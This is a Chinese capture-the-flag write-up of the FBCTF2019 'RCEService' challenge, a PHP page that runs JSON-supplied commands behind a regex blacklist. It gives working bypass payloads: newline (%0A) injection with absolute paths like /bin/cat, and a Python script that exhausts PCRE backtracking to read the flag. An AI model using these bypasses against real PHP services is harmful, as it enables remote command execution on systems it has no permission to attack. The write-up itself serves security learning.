# \[FBCTF2019]RCEService

## \[FBCTF2019]RCEService

## 考点

* `%0a`绕过preg\_match
* PRCE正则回溯
* 绝对路径绕过`putenv('PATH=/home/rceservice/jail');`

## wp

直接输`ls`会给出错误，显示提交的参数是`?cmd=ls`

![](<../.gitbook/assets/image (3) (1).png>)

要求输入json，输入`{"cmd":"ls"}`

![](<../.gitbook/assets/image (7).png>)

源码是给出的，如下

```php
<?php
putenv('PATH=/home/rceservice/jail');
if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];
  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
?>
```

### 第一种方法

基本上能过滤的全过滤了，并且在第一行`putenv('PATH=/home/rceservice/jail');`处指定了默认执行命令的位置，即如果执行`ls`，那么就相当于执行`/home/rceservice/jail/ls`，这里可以使用`/bin/cat`，`/bin/ls`这种方式绕过

而preg\_match默认不匹配换行，可以使用`%0A`绕过，payload：`{%0A"cmd":"ls"%0A}`

`%0A`如果放在开头，不满足``[\x00-\x1FA-Z0-9!#-/;-@[-`|~\x7F]+``这个条件。

payload：`{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}`

### 第二种方法

[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

脚本如下

```python
import requests

payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'

res = requests.post("http://26d07d48-6ef0-406d-94ad-b13c0c4908fa.node4.buuoj.cn:81/", data={"cmd":payload})
print(res.text)
```

## 小结

* preg\_match要能想到%0A绕过
